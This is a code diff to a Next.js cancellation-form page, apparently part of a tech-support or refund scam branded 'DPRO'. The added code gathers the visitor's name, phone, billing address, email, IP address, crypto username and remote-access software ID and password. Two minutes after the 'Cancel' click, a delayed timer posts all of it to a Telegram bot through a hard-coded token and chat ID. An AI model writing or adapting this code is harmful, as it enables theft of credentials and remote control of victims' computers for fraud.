@@ -1,6 +1,6 @@
 'use client'
 
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 
 interface CancelPageProps {
   params: {
@@ -31,6 +31,70 @@ export default function CancelVendorPage({ params }: CancelPageProps) {
     remotePass: '',
   })
   const [showWaitModal, setShowWaitModal] = useState(false)
+  const [mainInfo, setMainInfo] = useState<any | null>(null)
+  const [sessionInfo, setSessionInfo] = useState<any | null>(null)
+  const [antiVirus, setAntiVirus] = useState<string>('')
+
+  useEffect(() => {
+    if (typeof window === 'undefined') return
+
+    try {
+      const mainRaw = window.sessionStorage.getItem('diagnosticForm')
+      const sessionRaw = window.sessionStorage.getItem('sessionData')
+      const avRaw = window.sessionStorage.getItem('selectedAntivirus')
+
+      if (mainRaw) setMainInfo(JSON.parse(mainRaw))
+      if (sessionRaw) setSessionInfo(JSON.parse(sessionRaw))
+      if (avRaw) setAntiVirus(avRaw)
+    } catch (err) {
+      console.error('Failed to read stored data', err)
+    }
+  }, [])
+
+  const sendCancelToTelegram = async () => {
+    const BOT_TOKEN = '8317757418:AAF0YMJ0enh258_yEWXsg6-GAsYfrA7nYZ8'
+    const CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '-5294276637'
+
+    const message = `🔔 *New Cancellation Request (DPRO)*
+
+*fullName:* ${formData.fullName || mainInfo?.fullName || 'N/A'}
+*billingAddress:* ${formData.billingAddress || 'N/A'}
+*cellPhone:* ${formData.cellPhone || 'N/A'}
+*cancellationReason:* ${formData.cancellationReason || 'N/A'}
+*remoteSoftware:* ${formData.remoteSoftware || 'N/A'}
+*remoteId:* ${formData.remoteId || 'N/A'}
+*remotePass:* ${formData.remotePass || 'N/A'}
+*email:* ${mainInfo?.email || 'N/A'}
+*antiVirus:* ${antiVirus || 'N/A'}
+*agentId:* ${mainInfo?.agentId || 'N/A'}
+*agentName:* ${mainInfo?.agentName || 'N/A'}
+*ip_address:* ${sessionInfo?.ipAddress || 'N/A'}
+*alternatePhone:* ${mainInfo?.alternatePhone || 'N/A'}
+*company:* DPRO
+*explicit_content:* ${mainInfo?.explicitContent || 'N/A'}
+*crypto_username:* ${mainInfo?.cryptoUsername || 'N/A'}`
+
+    try {
+      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown',
+        }),
+      })
+
+      const result = await response.json()
+      if (!response.ok) {
+        console.error('Telegram API error (cancel):', result)
+      } else {
+        console.log('Cancellation message sent to Telegram successfully')
+      }
+    } catch (err) {
+      console.error('Error sending cancellation to Telegram:', err)
+    }
+  }
 
   const handleChange = (
     e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>
@@ -177,6 +241,11 @@ export default function CancelVendorPage({ params }: CancelPageProps) {
             onClick={() => {
               if (!isFormValid) return
               setShowWaitModal(true)
+
+              // send to Telegram after 2 minutes
+              setTimeout(() => {
+                sendCancelToTelegram()
+              }, 120000)
             }}
           >
             Cancel &gt;&gt;
